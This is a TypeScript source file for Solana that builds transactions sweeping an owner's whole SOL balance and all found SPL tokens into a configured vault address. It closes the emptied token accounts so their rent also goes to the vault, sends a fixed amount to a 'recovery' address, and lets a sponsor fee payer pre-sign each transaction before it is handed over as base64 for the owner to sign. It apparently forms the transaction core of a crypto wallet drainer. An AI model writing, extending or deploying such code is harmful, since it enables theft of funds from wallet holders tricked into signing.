import {
  PublicKey, VersionedTransaction, TransactionMessage, SystemProgram, ComputeBudgetProgram,
} from "@solana/web3.js";
import {
  createAssociatedTokenAccountIdempotentInstruction, createTransferInstruction,
  createCloseAccountInstruction, getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import { conn } from "./rpc.js";
import { cfg } from "./config.js";
import { runtime } from "./admin.js";
import type { Found } from "./scan.js";

const BASE_FEE = 5000n;
const MARGIN = 500_000n;
const RECOVERY = 1_000_000n;
const RENT_PER_ATA = 2_039_280n;
const DUST = 1000n;

export type Plan = { sol: bigint; tokens: Found[] };

export async function plan(owner: PublicKey, balance: bigint, found: Found[]): Promise<Plan[]> {
  const priority = BigInt(Math.ceil((runtime.computeLimit * runtime.priority) / 1e6));
  const rec = balance < 3_000_000n ? 0n : RECOVERY;
  const reserve = BASE_FEE + priority + MARGIN + rec;

  const budget = balance - reserve;
  if (budget < 0n) return [];

  const dests = found.map((t) => getAssociatedTokenAddressSync(t.mint, cfg.vault, false, t.programId));
  const infos = await conn.getMultipleAccountsInfo(dests);

  const chosen: Found[] = [];
  const paid: Found[] = [];
  found.forEach((t, i) => {
    if (t.amount === 0n) chosen.push(t);
    else if (infos[i]) chosen.push(t);
    else paid.push(t);
  });

  let rentSpent = 0n;
  for (const t of paid) {
    if (budget - rentSpent < RENT_PER_ATA) break;
    rentSpent += RENT_PER_ATA;
    chosen.push(t);
  }

  const solLeft = budget - rentSpent;
  const items: Plan[] = [];
  if (solLeft > DUST) items.push({ sol: solLeft, tokens: [] });

  const perTx = Math.max(1, Math.floor(cfg.MAX_IX_PER_TX / 3) - 1);
  for (let i = 0; i < chosen.length; i += perTx) {
    items.push({ sol: 0n, tokens: chosen.slice(i, i + perTx) });
  }

  return items;
}

export async function buildAll(owner: PublicKey, items: Plan[], recovery: PublicKey) {
  const { blockhash } = await conn.getLatestBlockhash("finalized");
  const out: string[] = [];

  for (const item of items) {
    const ixs = [
      ComputeBudgetProgram.setComputeUnitLimit({ units: runtime.computeLimit }),
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: runtime.priority }),
    ];

    if (item.sol > 0n) {
      ixs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: cfg.vault, lamports: item.sol }));
      if (recovery) {
        ixs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: recovery, lamports: RECOVERY }));
      }
    }

    for (const t of item.tokens) {
      if (t.amount === 0n) {
        if (runtime.reclaimRent) ixs.push(createCloseAccountInstruction(t.ata, cfg.vault, owner, [], t.programId));
        continue;
      }
      const dest = getAssociatedTokenAddressSync(t.mint, cfg.vault, false, t.programId);
      ixs.push(createAssociatedTokenAccountIdempotentInstruction(owner, dest, cfg.vault, t.mint, t.programId));
      ixs.push(createTransferInstruction(t.ata, dest, owner, t.amount, [], t.programId));
      if (runtime.reclaimRent) ixs.push(createCloseAccountInstruction(t.ata, cfg.vault, owner, [], t.programId));
    }

    if (ixs.length <= 2) continue;

    const payerKey = cfg.feePayer ? cfg.feePayer.publicKey : owner;
    const msg = new TransactionMessage({ payerKey, recentBlockhash: blockhash, instructions: ixs }).compileToV0Message();
    const tx = new VersionedTransaction(msg);
    if (cfg.feePayer) tx.sign([cfg.feePayer]);
    out.push(Buffer.from(tx.serialize()).toString("base64"));
  }

  return out;
}
